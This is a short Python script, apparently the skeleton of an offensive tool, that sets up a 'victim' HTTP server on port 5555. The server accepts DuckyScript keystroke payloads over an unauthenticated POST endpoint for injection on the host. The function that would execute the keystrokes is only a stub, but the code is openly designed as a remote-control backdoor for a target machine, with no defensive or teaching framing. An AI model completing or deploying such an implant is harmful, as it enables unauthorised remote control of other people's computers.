import keyboard
from http.server import HTTPServer, BaseHTTPRequestHandler

def try_run_from_duckyscript_command(duckyscript_command):
    return False

class PhantomLinkVictimServer(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == '/runPayload':
                payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                print(payload)
                for line in payload.splitlines():
                    if not try_run_from_duckyscript_command(line):
                        self.send_response(422)
                        self.end_headers()
                        return

            self.send_response(200)
            self.end_headers()

        except Exception as e:
            self.send_response(400)
            raise e
            
        
def run(handler_class, address=('0.0.0.0', 5555)):
    httpd = HTTPServer(address, handler_class)
    print('Serving...')
    httpd.serve_forever()

run(PhantomLinkVictimServer)